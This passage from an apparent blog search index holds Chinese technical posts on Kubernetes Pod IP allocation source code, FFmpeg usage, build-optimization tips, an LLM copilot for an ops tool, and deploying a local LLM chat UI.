的实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func NewCIDRRangeAllocator(logger klog.Logger, client clientset.Interface, nodeInformer informers.NodeInformer, allocatorParams CIDRAllocatorParams, nodeList *v1.NodeList) (CIDRAllocator, error) { nodeInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{ AddFunc: controllerutil.CreateAddNodeHandler(func(node *v1.Node) error { return ra.AllocateOrOccupyCIDR(logger, node) }), UpdateFunc: controllerutil.CreateUpdateNodeHandler(func(_, newNode *v1.Node) error { if len(newNode.Spec.PodCIDRs) == 0 { return ra.AllocateOrOccupyCIDR(logger, newNode) } return nil }), DeleteFunc: controllerutil.CreateDeleteNodeHandler(logger, func(node *v1.Node) error { return ra.ReleaseCIDR(logger, node) }), }) return ra, nil } 其实 RangeAllocator 分配器的实现与写 Operator 时的控制器类似，都是通过 informer 来监听资源的变化，然后调用相应的方法。\n1.3 更新节点的 podCIDR 这里比较特殊的是，控制器并不是直接操作资源，而是将变更放到了一个 channel 中，然后通过 goroutine 处理状态更新。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func (r *rangeAllocator) AllocateOrOccupyCIDR(logger klog.Logger, node *v1.Node) error { allocated := nodeReservedCIDRs{ nodeName: node.Name, allocatedCIDRs: make([]*net.IPNet, len(r.cidrSets)), } for idx := range r.cidrSets { podCIDR, err := r.cidrSets[idx].AllocateNext() allocated.allocatedCIDRs[idx] = podCIDR } // 将更新的内容放入 channel 中 r.nodeCIDRUpdateChannel \u0026lt;- allocated return nil } nodeCIDRUpdateChannel 的长度是 5000。\n1 2 cidrUpdateQueueSize = 5000 nodeCIDRUpdateChannel: make(chan nodeReservedCIDRs, cidrUpdateQueueSize), 而更新 Node Spec 的逻辑是通过 30 个 goroutine 来处理。\n1 2 3 4 const cidrUpdateWorkers untyped int = 30 for i := 0; i \u0026lt; cidrUpdateWorkers; i++ { go r.worker(ctx) } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func (r *rangeAllocator) worker(ctx context.Context) { logger := klog.FromContext(ctx) for { select { case workItem, ok := \u0026lt;-r.nodeCIDRUpdateChannel: if !ok { logger.Info(\u0026#34;Channel nodeCIDRUpdateChannel was unexpectedly closed\u0026#34;) return } if err := r.updateCIDRsAllocation(logger, workItem); err != nil { // Requeue the failed node for update again. r.nodeCIDRUpdateChannel \u0026lt;- workItem } case \u0026lt;-ctx.Done(): return } } } cidrUpdateRetries = 3 这里会重试 3 次更新，如果一直更新失败，会将节点重新放入 channel 中，等待下次更新。\n1 2 3 4 5 6 7 8 9 10 11 12 // updateCIDRsAllocation assigns CIDR to Node and sends an update to the API server. func (r *rangeAllocator) updateCIDRsAllocation(logger klog.Logger, data nodeReservedCIDRs) error { // If we reached here, it means that the node has no CIDR currently assigned. So we set it. for i := 0; i \u0026lt; cidrUpdateRetries; i++ { if err = nodeutil.PatchNodeCIDRs(r.client, types.NodeName(node.Name), cidrsString); err == nil { logger.Info(\u0026#34;Set node PodCIDR\u0026#34;, \u0026#34;node\u0026#34;, klog.KObj(node), \u0026#34;podCIDRs\u0026#34;, cidrsString) return nil } } // 放回 pool 中 controllerutil.RecordNodeStatusChange(logger, r.recorder, node, \u0026#34;CIDRAssignmentFailed\u0026#34;) } 使用 Patch 方法更新节点对象的 Spec 字段。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func PatchNodeCIDRs(c clientset.Interface, node types.NodeName, cidrs []string) error { // set the Pod cidrs list and set the old Pod cidr field patch := nodeForCIDRMergePatch{ Spec: nodeSpecForMergePatch{ PodCIDR: cidrs[0], PodCIDRs: cidrs, }, } patchBytes, err := json.Marshal(\u0026amp;patch) if err != nil { return fmt.Errorf(\u0026#34;failed to json.Marshal CIDR: %v\u0026#34;, err) } if _, err := c.CoreV1().Nodes().Patch(context.TODO(), string(node), types.StrategicMergePatchType, patchBytes, metav1.PatchOptions{}); err != nil { return fmt.Errorf(\u0026#34;failed to patch node CIDR: %v\u0026#34;, err) } return nil } 2. kubelet 对网络的配置 上图是 Kubelet 创建 Pod 的过程，这里截取其中对网络配置的部分进行分析:\nPod 调度到某个节点上 kubelet 通过 cri 调用 container runtime 创建 sandbox container runtime 创建 sandbox container runtime 调用 cni 创建 Pod 网络 IPAM 对 Pod IP 的管理 下面从源码实现的角度来看看这个过程。\n2.1 Pod 调度到某个节点上 1 2 3 4 5 6 7 8 9 10 11 12 apiVersion: v1 kind: Pod metadata: labels: app: demo pod-template-hash: 7b9b5cf76b name: demo-7b9b5cf76b-5lpmj namespace: default spec: containers: - image: hubimage/demo-ubuntu nodeName: node1 Kubernetes 中调度的过程是 kube-scheduler 根据 Pod 的资源需求和节点的资源情况，将 Pod 调度到某个节点上，并将调度结果写入 pod.spec.nodeName 字段。\n这部分不是网络的重点，之前我也在生产环境下定制过调度器，感兴趣的话可以看看 Tekton 优化之定制集群调度器 。\n2.2 kubelet 调用 cri 创建 sandbox SyncPod 是 kubelet 中的核心方法，它会根据 Pod 的状态，调用 cri 创建或删除 pod。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // SyncPod syncs the running Pod into the desired Pod by executing following steps: // // 1.计算沙箱和容器变化。 // 2. 必要时关闭 Pod 沙箱。 // 3. 关闭任何不应运行的容器。 // 4.必要时创建沙箱。 // 5.创建 ephemeral 容器。 // 6. 创建 init 容器。 // 7. 调整运行容器的大小（如果 InPlacePodVerticalScaling==true） // 8. 创建正常容器 func (m *kubeGenericRuntimeManager) SyncPod(ctx context.Context, Pod *v1.Pod, podStatus *kubecontainer.PodStatus, pullSecrets []v1.Secret, backOff *flowcontrol.Backoff) (result kubecontainer.PodSyncResult) { // Step 4: Create a sandbox for the Pod if necessary. podSandboxID, msg, err = m.createPodSandbox(ctx, pod, podContainerChanges.Attempt) } 调用 RuntimeService 接口的 RunPodSandbox 方法创建 sandbox。\n1 2 3 // createPodSandbox creates a Pod sandbox and returns (podSandBoxID, message, error). func (m *kubeGenericRuntimeManager) createPodSandbox(ctx context.Context, Pod *v1.Pod, attempt uint32) (string, string, error) { podSandBoxID, err := m.runtimeService.RunPodSandbox(ctx, podSandboxConfig, runtimeHandler) 经过 runtimeService、instrumentedRuntimeService 接口的封装，最终会调用 remoteRuntimeService 的 RunPodSandbox 方法。\n1 2 3 4 5 6 7 // RunPodSandbox creates and starts a pod-level sandbox. Runtimes should ensure // the sandbox is in ready state. func (r *remoteRuntimeService) RunPodSandbox(ctx context.Context, config *runtimeapi.PodSandboxConfig, runtimeHandler string) (string, error) { resp, err := r.runtimeClient.RunPodSandbox(ctx, \u0026amp;runtimeapi.RunPodSandboxRequest{ Config: config, RuntimeHandler: runtimeHandler, }) 这里的 runtimeClient 是一个 rpc client，通过 rpc 调用 container runtime 创建 sandbox。\n2.3 container runtime 创建 sandbox 以 containerd 为例，创建 sandbox:\n1 2 3 4 5 6 7 func (in *instrumentedService) RunPodSandbox(ctx context.Context, r *runtime.RunPodSandboxRequest) (res *runtime.RunPodSandboxResponse, err error) { if err := in.checkInitialized(); err != nil { return nil, err } res, err = in.c.RunPodSandbox(ctrdutil.WithNamespace(ctx), r) return res, errdefs.ToGRPC(err) } 调用 CNI 创建网络，创建 sandbox。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // RunPodSandbox creates and starts a pod-level sandbox. Runtimes should ensure // the sandbox is in ready state. func (c *criService) RunPodSandbox(ctx context.Context, r *runtime.RunPodSandboxRequest) (_ *runtime.RunPodSandboxResponse, retErr error) { // 生成 sandbox id id := util.GenerateID() metadata := config.GetMetadata() name := makeSandboxName(metadata) // 获取 sandbox 的 oci 运行时 ociRuntime, err := c.getSandboxRuntime(config, r.GetRuntimeHandler()) sandboxInfo.Runtime.Name = ociRuntime.Type sandboxInfo.Sandboxer = ociRuntime.Sandboxer // 创建 sandbox 对象 sandbox := sandboxstore.NewSandbox( sandboxstore.Metadata{ ID: id, Name: name, Config: config, RuntimeHandler: r.GetRuntimeHandler(), }, sandboxstore.Status{ State: sandboxstore.StateUnknown, }, ) // 调用 CNI 插件，创建 sandbox 的网络 if !hostNetwork(config) \u0026amp;\u0026amp; !userNsEnabled { var netnsMountDir = \u0026#34;/var/run/netns\u0026#34; sandbox.NetNS, err = netns.NewNetNS(netnsMountDir) // Save sandbox metadata to store if err := c.setupPodNetwork(ctx, \u0026amp;sandbox); err != nil { return nil, fmt.Errorf(\u0026#34;failed to setup network for sandbox %q: %w\u0026#34;, id, err) } } // 创建 sandbox err = c.nri.RunPodSandbox(ctx, \u0026amp;sandbox) } 2.4 container runtime 调用 cni 创建 Pod 网络 在上一步骤中，调用 RunPodSandbox 创建 sandbox 之前，会先调用 setupPodNetwork 配置网络。这里展开看一下 setupPodNetwork 的实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func (c *criService) setupPodNetwork(ctx context.Context, sandbox *sandboxstore.Sandbox) error { var ( id = sandbox.ID config = sandbox.Config path = sandbox.NetNSPath netPlugin = c.getNetworkPlugin(sandbox.RuntimeHandler) err error result *cni.Result ) if c.config.CniConfig.NetworkPluginSetupSerially { result, err = netPlugin.SetupSerially(ctx, id, path, opts...) } else { result, err = netPlugin.Setup(ctx, id, path, opts...) } } libcni 实现了 netPlugin 接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // containerd/go-cni/cni.go func (c *libcni) Setup(ctx context.Context, id string, path string, opts ...NamespaceOpts) (*Result, error) { if err := c.Status(); err != nil { return nil, err } // 建一个新的网络命名空间 ns, err := newNamespace(id, path, opts...) if err != nil { return nil, err } // 调用 CNI 插件 result, err := c.attachNetworks(ctx, ns) if err != nil { return nil, err } return c.createResult(result) } attachNetworks 起了很多协程，每个协程调用 asynchAttach 方法，asynchAttach 方法调用 Attach 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 func (c *libcni) attachNetworks(ctx context.Context, ns *Namespace) ([]*types100.Result, error) { var wg sync.WaitGroup var firstError error results := make([]*types100.Result, len(c.Networks())) rc := make(chan asynchAttachResult) for i, network := range c.Networks() { wg.Add(1) go asynchAttach(ctx, i, network, ns, \u0026amp;wg, rc) } for range c.Networks() { rs := \u0026lt;-rc if rs.err != nil \u0026amp;\u0026amp; firstError == nil { firstError = rs.err } results[rs.index] = rs.res } wg.Wait() return results, firstError } 运行了很多协程调用 CNI，但 rc channel 的长度为 1，处理结果时却一个一个的。\n1 2 3 4 5 func asynchAttach(ctx context.Context, index int, n *Network, ns *Namespace, wg *sync.WaitGroup, rc chan asynchAttachResult) { defer wg.Done() r, err := n.Attach(ctx, ns) rc \u0026lt;- asynchAttachResult{index: index, res: r, err: err} } Attach 方法中才真正开始调用 CNI 插件。\n1 2 3 4 5 6 7 func (n *Network) Attach(ctx context.Context, ns *Namespace) (*types100.Result, error) { r, err := n.cni.AddNetworkList(ctx, n.config, ns.config(n.ifName)) if err != nil { return nil, err } return types100.NewResultFromResult(r) } 在 https://github.com/containernetworking/cni/blob/main/libcni/api.go 中 CNI 接口定义了很多方法，其中最重要的是 AddNetwork 和 DelNetwork 方法，带 List 的方法是批量操作。\n1 2 3 4 5 6 type CNI interface { AddNetworkList(ctx context.Context, net *NetworkConfigList, rt *RuntimeConf) (types.Result, error) AddNetwork(ctx context.Context, net *NetworkConfig, rt *RuntimeConf) (types.Result, error) DelNetworkList(ctx context.Context, net *NetworkConfigList, rt *RuntimeConf) error DelNetwork(ctx context.Context, net *NetworkConfig, rt *RuntimeConf) error } AddNetwork 用于为容器添加网络接口，在主机上创建 veth 网卡绑定到容器的 ech0 网卡上。DelNetwork 用于在容器删除时，清理容器相关的网络配置。\nCNI 调用插件的核心是 Exec 接口，直接调用二进制程序。\n1 2 3 4 5 type Exec interface { ExecPlugin(ctx context.Context, pluginPath string, stdinData []byte, environ []string) ([]byte, error) FindInPath(plugin string, paths []string) (string, error) Decode(jsonBytes []byte) (version.PluginInfo, error) } CRI 以标准输入、环境变量的形式将网络配置信息传递给 CNI 插件。CNI 插件处理完成之后，将网络配置信息写入到标准输出中，CRI 将标准输出中的网络配置信息解析出来，写入到容器的网络配置文件中。\n再回到 container runtime 的实现 containerd:\n1 2 3 4 5 /usr/bin/containerd config dump |grep cni [plugins.\u0026#34;io.containerd.grpc.v1.cri\u0026#34;.cni] bin_dir = \u0026#34;/opt/cni/bin\u0026#34; conf_dir = \u0026#34;/etc/cni/net.d\u0026#34; 这里的 /etc/cni/net.d 是 CNI 网络配置文件的默认存放路径，/opt/cni/bin 是 CNI 网络插件的默认搜索路径。\n1 2 3 4 ls /opt/cni/bin bandwidth calico cilium-cni firewall host-device install loopback portmap sbr tuning vrf bridge calico-IPAM dhcp flannel host-local ipvlan macvlan ptp static vlan 1 2 3 4 5 6 7 cat /etc/cni/net.d/05-cilium.conf { \u0026#34;cniVersion\u0026#34;: \u0026#34;0.3.1\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;cilium\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;cilium-cni\u0026#34;, \u0026#34;enable-debug\u0026#34;: false } 这些配置用来初始化 CRI 获取 CNI 插件的 netPlugin map[string]cni.CNI 结构。\n2.5 IPAM 对 Pod IP 的管理 IPAM 是 IP Address Management 的缩写，负责为容器分配 ip 地址。IPAM 组件通常是一个独立的二进制文件，也可以直接由 CNI 插件实现。在 https://github.com/containernetworking/plugins/tree/main/plugins/ipam 中，目前有三种实现 host-local、dhcp、static。 这里以 host-local 为例:\n查看 CNI 的配置文件 1 2 3 4 5 6 7 8 9 10 11 cat /etc/cni/net.d/10-cni.conflist { \u0026#34;name\u0026#34;: \u0026#34;networks\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;cni\u0026#34;, \u0026#34;ipam\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;host-local\u0026#34;, \u0026#34;subnet\u0026#34;: \u0026#34;10.234.58.0/24\u0026#34;, \u0026#34;routes\u0026#34;: [{ \u0026#34;dst\u0026#34;: \u0026#34;0.0.0.0/0\u0026#34; }] } } 指定了 CNI 插件的类型为 host-local，指定了 Pod IP 的网段为 \u0026ldquo;10.234.58.0/24\u0026rdquo; 。\n查看 CNI 插件的存储目录 1 2 3 ls /var/lib/cni/networks 10.234.58.76 10.234.58.87 last_reserved_ip.0 lock 1 2 3 cat 10.234.58.76 b3b668af977bbeca6853122514044865793c056e81cccebf115dacffd25a8bcc 这里有一组以 ip 命名的文件，而文件里面又是一串字符串。那么这些到底是什么呢？\n以 ip 命名的文件是如何生成的 申请一个 Pod IP 时，先获取一个可用 ip\n1 2 3 4 5 func cmdAdd(args *skel.CmdArgs) error { for idx, rangeset := range ipamConf.Ranges { ipConf, err := allocator.Get(args.ContainerID, args.IfName, requestedIP) } } 获取到可用 ip 之后，先尝试着存储到本地目录文件中\n1 2 3 4 5 6 func (a *IPAllocator) Get(id string, ifname string, requestedIP net.IP) (*current.IPConfig, error) { for { reservedIP, gw = iter.Next() reserved, err := a.store.Reserve(id, ifname, reservedIP.IP, a.rangeID) } } 直接写本地文件目录\n1 2 3 4 5 6 7 8 9 10 11 12 13 func (s *Store) Reserve(id string, ifname string, ip net.IP, rangeID string) (bool, error) { fname := GetEscapedPath(s.dataDir, ip.String()) f, err := os.OpenFile(fname, os.O_RDWR|os.O_EXCL|os.O_CREATE, 0o600) if os.IsExist(err) { return false, nil } if _, err := f.WriteString(strings.TrimSpace(id) + LineBreak + ifname); err != nil { f.Close() os.Remove(f.Name()) return false, err } } 写入的内容为 strings.TrimSpace(id) + LineBreak + ifname，这里的 id 其实是容器的 id，ifname 是网卡名称，LineBreak 是换行符。\n通过 id 在主机上可以找到对应的容器:\n1 2 3 docker ps |grep b3b668 b3b668af977b k8s.gcr.io/pause:3.5 \u0026#34;/pause\u0026#34; 6 weeks ago Up 6 weeks k8s_POD_xxx-5b795fd7dd-82hrh_kube-system_b127b65c-f0ca-48a7-9020-ada60dfa535a_0 last_reserved_ip.0 文件的用途 1 2 3 cat last_reserved_ip.0 10.234.58.87 在获取可用 IP 时，IPAM 会创建一个迭代器。\n1 2 3 4 5 6 7 8 9 10 11 func (a *IPAllocator) Get(id string, ifname string, requestedIP net.IP) (*current.IPConfig, error) { iter, err := a.GetIter() if err != nil { return nil, err } for { reservedIP, gw = iter.Next() if reservedIP == nil { break } } 而迭代器需要依靠 last_reserved_ip.0 找到上一次分配的 IP，然后从这个 IP 之后开始分配。\n1 2 3 4 5 6 7 func (a *IPAllocator) GetIter() (*RangeIter, error) { lastReservedIP, err := a.store.LastReservedIP(a.rangeID) if err != nil \u0026amp;\u0026amp; !os.IsNotExist(err) { log.Printf(\u0026#34;Error retrieving last reserved ip: %v\u0026#34;, err) } else if lastReservedIP != nil { startFromLastReservedIP = a.rangeset.Contains(lastReservedIP) } 这里的 lastIPFilePrefix = \u0026ldquo;last_reserved_ip.\u0026rdquo;\n1 2 3 4 5 6 7 8 func (s *Store) LastReservedIP(rangeID string) (net.IP, error) { ipfile := GetEscapedPath(s.dataDir, lastIPFilePrefix+rangeID) data, err := os.ReadFile(ipfile) if err != nil { return nil, err } return net.ParseIP(string(data)), nil } host-local 分配 ip 时是按照轮询的方式，递增分配，如果分配到最后一个 IP，就又从头开始分配。\nlock 文件 1 2 3 4 type Store struct { *FileLock dataDir string } 每次存储操作都会进行加锁，IP 分配不会并发进行，确保唯一性。\n1 2 a.store.Lock() defer a.store.Unlock() 3. 总结 本篇主要是从 Pod IP 管理的角度，梳理了一下从 kube-controller-manager 到 kubelet 的 Pod IP 管理过程。主要内容如下:\nkube-controller-manager 通过 NodeIpamController 控制器为每个节点分配 Pod IP 网段，在集群规划时需要根据集群规模调整 cluster-cidr、node-cidr-mask-size 参数 kubelet 通过 cri 调用 container runtime 创建 sandbox container runtime 调用 cni 创建 Pod 网络 IPAM 对 Pod IP 的管理 在工作中很多熟悉的路径，可能仅仅只是知道大概的流程，不知道具体的实现。通过源码分析，可以更加深入地了解相关的细节，也能学习到新的知识。\n比如，在源码中，我看到了 InPlacePodVerticalScaling 这个参数，发现是 Kubernetes 1.27 的一个 alpha feature，可以在不重启 Pod 的情况下，调整 Pod 的资源配置；在写 Operator 更新 CR 状态时，在合适的场景下，可以学习 nodeCIDRUpdateChannel 的实现，将更新的状态放入 channel 中，然后通过 goroutine 处理状态更新。\n","description":"","id":91,"section":"post","tags":["源码分析","Kubernetes","Pod","IP","网络","博文"],"title":"源码分析 Kubernetes 对 Pod IP 的管理","uri":"https://www.chenshaowen.com/blog/source-analysis-kubernetes-management-of-pod-ip.html"},{"content":"1. 安装 FFmpeg macOS 上执行命令:\n1 brew install ffmpeg 2. FFmpeg 使用 1 ffmpeg {1} {2} -i {3} {4} {5} 五个部分的参数依次如下:\n全局参数，-y、-loglevel、-preset 等用来控制的整体行为 输入文件参数，-i、-ss、-t、-stream_loop 等用来控制输入文件的读入方式 输入文件，要处理的音视频输入文件路径 输出文件参数，-c:v、-c:a、-vf、-af 等,用来控制输出的编码、过滤方式 输出文件，处理后的输出音视频文件路径 常见输出参数:\n-vcodec 指定视频编码器，copy 表示只做拷贝，不做编解码\n-acodec 指定音频解码器，copy 表示只做拷贝，不做编解码\n使用 copy 参数时，由于不做编解码，效率快很多。如果输入文件和输出文件的编码格式不一致，就会报错。另外，FFmpeg 会根据文件的后缀名猜测出封装格式。\n3. 一些使用场景 查看视频信息 1 2 3 4 5 6 7 8 9 10 ffmpeg -i input.mp4 Input #0, mov,mp4,m4a,3gp,3g2,mj2, from \u0026#39;input.mp4\u0026#39;: Duration: 00:01:03.11, start: 0.000000, bitrate: 257 kb/s Stream #0:0(und): Video: h264 (High) (avc1 / 0x31637661), yuv420p(tv, bt709), 640x360 [SAR 1:1 DAR 16:9], 210 kb/s, 30 fps, 30 tbr, 16k tbn, 60 tbc (default) Metadata: handler_name : VideoHandler Stream #0:1(und): Audio: aac (HE-AAC) (mp4a / 0x6134706D), 44100 Hz, stereo, fltp, 39 kb/s (default) Metadata: handler_name : SoundHandler 其包含两个流数据，一个是 h264 编码的视频流，一个是 aac 编码的音频流。\n分离音频 1 ffmpeg -i input.mp4 -vn -acodec copy output.aac -vn 表示不处理视频流，-acodec copy 表示直接拷贝音频流，不做编解码。\n转换音频格式 1 ffmpeg -i output.aac output.mp3 分离视频 1 ffmpeg -i input.mp4 -an -vcodec copy output.h264 转换视频格式 1 ffmpeg -i output.h264 output.mkv 合并音视频 1 ffmpeg -i output.h264 -i output.aac output-2.mp4 4. 参考 https://www.ruanyifeng.com/blog/2020/01/ffmpeg.html ","description":"","id":92,"section":"post","tags":["博文","FFmpeg","视频","教程"],"title":"FFmpeg 使用简易教程","uri":"https://www.chenshaowen.com/blog/simple-tutorial-on-using-ffmpeg.html"},{"content":" 持续更新中\u0026hellip;\n1. Golang 使用 trimpath 移除编译路径，避免暴露编译路径信息 1 go build -gcflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -asmflags=\u0026#34;all=-trimpath=${PWD}\u0026#34; -o ./bin/opscli ./cmd/cli/main.go 添加之前异常输出路径 /Users/shaowenchen/Code/Github/ops/main.go，添加之后异常输出路径 main.go 。\n-ldflags \u0026ldquo;-w -s\u0026rdquo; 移除调试信息，减小二进制文件大小 1 go build -ldflags \u0026#34;-w -s\u0026#34; -o ./bin/opscli ./cmd/cli/main.go 添加之前 55 MB，添加之后 44 MB。\n2. Python 提前编译生成 pyc 文件 1 2 3 python -m compileall -b ./ find ./ -name \u0026#34;*.py\u0026#34;|egrep -v \u0026#39;settings.py|wsgi.py|gunicorn_config.py\u0026#39;|xargs rm -rf find ./ -name \u0026#34;__pycache__\u0026#34; |xargs rm -rf 虽然 pyc 可以被反编译，但这么做可以增加一点难度。通常启动配置文件被编译之后，不会移除源码，这是为了部署时调试。\n3. Node 提交 yarn.lock 文件，生产时使用 --frozen-lockfile 锁定依赖 1 yarn install --frozen-lockfile package.json 用于指定版本范围，而 yarn.lock 锁定精确版本。\n使用 yarn install, 如果 package.json 依赖版本与 yarn.lock 冲突,会更新 yarn.lock 文件。\n--frozen-lockfile 锁定依赖版本，不会更新 yarn.lock 文件，也大大节省了安装时间，避免卡在 Building fresh packages。但需要注意检查一下 yarn.lock 中的文件链接是否符合预期，比如是否使用的内网等。\n安装依赖包时 ESOCKETTIMEDOUT 1 yarn config set network-timeout 300000 或者\n1 yarn install --network-timeout 300000 将超时时间从默认的 30s 改为 300s。\n另一种说法是，磁盘慢了，导致安装依赖包超时，可以尝试升级试试。\n4. Makefile -j 开启多线程构建 1 make -j -j 默认使用与 CPU 核心数相同的线程数，可以使用 -j 4 指定线程数。\n虽然并行构建的效率高，如果有依赖关系可能导致构建失败，同时排查问题也会更复杂。\n5. 平台侧 Docker 无法拉取 v1 镜像格式 1 Error response from daemon: mediaType in manifest list should be \u0026#39;application/vnd.docker.distribution.manifest.list.v2+json\u0026#39; not \u0026#39;application/vnd.oci.image.index.v1+json\u0026#39; 如果你使用的 Docker 版本小于 19.03，可以在 /etc/docker/daemon.json 中设置 \u0026quot;disable-legacy-registry\u0026quot;:true，重启 Docker 即可。或者在 Docker Client 命令中添加 --disable-legacy-registry 参数拉取。\n原因在于 v1 镜像格式已经被弃用，Docker 新版本已经不再支持 v1 镜像格式。\n使用 buildx 使用 buildx 能更好使用缓存。但 Docker 默认不安装 buildx，需要手动安装。\n对于 linux 系统，先去 buildx release 页面下载对应的二进制文件 https://github.com/docker/buildx/releases ，然后将二进制文件重命名为 docker-buildx，放到 $HOME/.docker/cli-plugins\t目录下即可。\n","description":"","id":93,"section":"post","tags":["博文","CICD","DevOps","最佳实践"],"title":"一些程序构建的优化技巧","uri":"https://www.chenshaowen.com/blog/some-tips-for-optimizing-program-building.html"},{"content":"1. 什么是 Ops 工具 https://www.chenshaowen.com/ops/ 是我日常运维最频繁使用的工具之一。\n运维机器，我可以复用之前的脚本，批量进行操作。\n运维集群，我可以复用之前的脚本，不用登录节点也可以操作机器。\n如果遇到新的运维问题，我会马上编写 Task Yaml 对操作进行固化，方便下一次复用。\nOps 的核心操作是脚本执行和文件分发，核心对象是主机、Kubernetes 集群。主机和集群都需要实现 Ops 的两种核心操作，最上层是 Task 编排，沉淀运维场景。\n2. 为什么要写 Copilot 尝试开发基于大模型的应用。大模型提供了一种全新的使用和设计思路，代表着先进的生产方式。对于人类来说，重复、繁琐、机械的事情，只要有足够的数据积累，都可以交给大模型来完成。应用会朝着基于大模型的方向演进，我也希望自己在这个方向上多思考落地的可能。\n弥补 Ops 工具场景不足的问题。Ops 可以实现有限的运维核心能力，对接有限的基础设施。但无法满足无限的运维场景，开放式的场景需要一个类似大模型这样的智能体，对场景进行肢解，转换为按照一定逻辑执行的 Ops 已经实现的核心能力。这种开发场景到有限核心能力的转换，是基于大模型的应用需要重点考虑的一个问题。\n写 Copilot 比想象中简单，但需要一个使用的场景，促进思考与迭代。前段时间，一直在折腾大模型推理，这周正好有时间开发 Ops。从有想法，到开始写，再到有点效果，不到半周时间，真正写代码的时间不到一天。\n能提高我的工作效率。Ops 目前有三个组件，Opscli、OpsServer、OpsController。Opscli 是命令行工具，形态上很类似一个大模型的前端，同时 Opscli 也是我高频使用的组件，在 Opscli 上集成 Copliot 有助于节省我排查故障、变更配置所需的时间。\n3. 聊聊我的思路 3.1 处理流程 如上图:\n用户的输入，可能是一条文本，一个点击，当然也可以是一个事件 大模型需要针对这个输入，将其转换为系统内部的若干步骤 我的应用执行这一系列的任务 大模型整理这些任务的执行结果，给出一个输出。这个输出可能是一个提示，一个弹框，一个文本，一个事件。 3.2 拆解任务 在上面处理流程中，第一个难点就是如何拆分任务。\n如上图:\n人的思维是方向性的，人的描述是抽象的。\n比如，人饿的时候说，”我饿了“，”我要吃饭“。但这种表述，对于机器来说，是无法理解的。你得说，\u0026ldquo;我在半个小时之后，在家里，吃饭，一碗米饭，一个番茄炒鸡蛋，一个炒青菜\u0026rdquo;，这样才是机器能够理解，并且可以得以执行的。\n这种抽象的任务转换为具体任务 TodoList 的过程，就是 Copilot 需要完成的核心功能之一。\n在拆解任务的过程中，除了需要大模型本身的智能外，还需要:\n领域大知识，大模型掌握的是泛泛的知识，比如文化习惯、语言习惯、行为习惯等，但是对于具体的、最新的领域知识，大模型是来不及学习的，也没有足够的语料来学习。如果能通过动态加载 lora 微调的方式、向量知识库，来加载领域知识，会是一个很好的方式。 我的应用相关的信息。我的应用对于大模型来说，是一个黑盒，全新、陌生、不了解的新事物。只有让大模型理解我的应用，才能更好的拆解任务。 上下文。每次事件的响应，都需要考虑上下文。哪一个用户，哪一个数据库，哪一个集群，哪一个操作系统等，这些组成了上下文信息。 有了这些补充，大模型就可以将抽象的任务转换为具体的任务，以供我的应用执行。\n3.3 对大模型暴露应用信息 这又是一个我需要继续优化 Ops 工具的地方。\n如上图:\n为了让大模型更好理解我的应用，我需要将应用详细完整的文档提交给大模型。但提交全部的文档给大模型，不具备可行性。你不仅要克服大模型处理的最长文本限制，还需要考虑因长文本导致的中间段信息丢失的问题。因此，最好的办法就是提交一个 Schema，提交你的设计思路，而不是提交你的设计实现。\n同理的还有 API\\CLI 的实现，不要将一个一个接口 URL、参数、返回值都提交给大模型，而是要告诉大模型，你的 API\\CLI 的设计思路是什么。\n但这对应用的设计者提出了非常高的要求，我们不能再人云亦云、到处抄袭，而是要让产品有简单、自洽、统一的设计。\n4. 现在啥进度、未来啥计划 目前 Ops 的 Copilot 还处于非常初级的阶段，实现了类似 open-interpreter 的功能。\nopscli copilot 能够根据用户的输入，在本地执行脚本，输出结果，完成类似，打开浏览器、查询 Kubernetes 集群各种信息、关闭微信应用等任务。\n如果开发顺利，我希望 opscli copilot 能演化为一个单独的服务 OpsCopilot，对接 OpsCli、OpsServer、OpsController。\n同时，Copilot 也不会依赖任何 GPT-3.5、GPT-4 等模型专有的一些功能特性，比如 function call 等，保持 Copilot 的通用性，而不是兼容性。\n","description":"","id":94,"section":"post","tags":["博文","大模型","思考","API","文档","LLM","Ops","Copilot"],"title":"我在给 Ops 工具写 Copilot","uri":"https://www.chenshaowen.com/blog/writing-copilot-for-my-ops-tool.html"},{"content":"1. 本地容器运行 启动 LLM 1 docker run --rm -p 8000:8000 shaowenchen/chinese-alpaca-2-7b-gguf:Q2_K 在 http://localhost:8000/docs 页面即可看到接口文档，如下图:\n部署一个简单的 Chat UI 这里需要注意的是 OPENAI_API_HOST 参数，需要设置为你的宿主机 IP 地址，而不是 localhost 127.0.0.1，否则无法访问。\n1 docker run -e OPENAI_API_HOST=http://{YOUR_HOST_IP}:8000 -e OPENAI_API_KEY=random -p 3000:3000 hubimage/chatbot-ui:main 页面效果如下:\n2. K8s 快速部署 部署 LLM 应用 kubectl create deploy vicuna --image=shaowenchen/vicuna-33b-v1.3-gguf:full kubectl expose deploy vicuna --port 8000 --target-port=8000 --type=NodePort 这里也可以不暴露端口，只创建一个 service，然后在其他容器中使用 vicuna 作为域名访问。\n部署 Chat UI 1 2 3 kubectl create deployment chatgpt --image=hubimage/chatbot-ui:main kubectl set env deployment/chatgpt OPENAI_API_HOST=http://vicuna:8000 OPENAI_API_KEY=random kubectl expose deployment chatgpt --port=3000 --target-port=3000 --type=NodePort 获取访问地址 1 2 3 4 NODE_PORT=$(kubectl get svc chatgpt -o jsonpath=\u0026#39;{.spec.ports[0].nodePort}\u0026#39;) NODE_IP=$(kubectl get nodes -o jsonpath=\u0026#39;{.items[0].status.addresses[0].address}\u0026#39;) echo \u0026#34;http://$NODE_IP:$NODE_PORT\u0026#34; 3. 测试与使用 提问:\n请自我介绍下 回复:\n你好，我是ChatGPT，一个基于OpenAI推理生成模型的大规模语言模型。借助 